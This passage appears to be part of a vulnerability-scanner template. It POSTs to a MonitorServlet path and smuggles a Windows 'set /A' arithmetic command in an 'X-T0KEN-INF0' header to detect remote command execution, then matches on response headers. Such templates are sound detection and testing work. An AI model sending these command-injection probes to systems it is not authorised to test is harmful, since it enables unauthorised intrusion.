http:
  - id: "r0"
    method: POST
    path:
      - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
    headers:
      Content-Type: "multipart/form-data"
      X-T0KEN-INF0: "set /A {{rInt1}}+{{rInt2}}"
    body: "{{rb}}"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "X-T0KEN"
      - type: regex
        part: header
        regex:
